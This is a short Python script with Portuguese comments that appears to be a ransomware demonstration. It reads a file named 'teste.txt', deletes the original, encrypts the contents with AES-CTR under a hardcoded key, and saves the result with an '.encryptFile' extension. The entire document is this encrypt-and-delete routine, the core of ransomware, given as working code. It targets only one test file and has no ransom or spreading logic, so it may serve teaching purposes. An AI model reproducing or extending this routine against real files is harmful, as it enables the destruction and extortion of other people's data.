import os
import pyaes

# Abrindo o arquivo que será criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Removendo o arquivo
os.remove(file_name)

# Chave de criptografia
key = b'key_decrypt_file'
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.encryptFile'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
